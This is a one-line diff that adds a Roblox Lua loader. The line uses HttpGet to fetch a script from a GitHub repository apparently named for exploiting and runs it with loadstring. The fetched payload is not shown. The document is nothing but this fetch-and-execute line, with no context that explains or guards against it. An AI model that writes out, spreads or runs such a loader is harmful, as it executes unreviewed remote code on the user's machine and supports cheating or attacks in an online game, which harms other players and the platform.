@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/FaelTheExploiter/LuaU/main/ye%E6%89%93-%E6%BB%911'),true))()
